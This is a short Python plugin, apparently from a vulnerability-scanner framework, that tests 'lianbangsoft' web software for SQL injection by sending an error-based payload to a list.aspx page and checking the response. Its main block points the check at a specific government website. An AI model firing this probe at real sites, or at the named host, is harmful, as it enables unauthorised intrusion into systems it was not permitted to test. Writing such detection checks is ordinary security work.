#!/usr/bin/python
#-*- encoding:utf-8 -*-
#title:lianbangsoft sql injection
#author:POX_HT
#ref: http://wooyun.org/bugs/wooyun-2010-0106667


def assign(service, arg):
    if service == "lianbangsoft":
        return True, arg


def audit(arg):
    payload = "portal/dzjc/jsjy/list.aspx?columnTag=convert(int,%27tes%27%2b%27tvul%27)"
    url = arg + payload
    code, head,res, errcode, _url = curl.curl(url)
    #print res
    if code==500 and 'testvul' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('lianbangsoft', 'http://xzfw.wulian.gov.cn/')[1])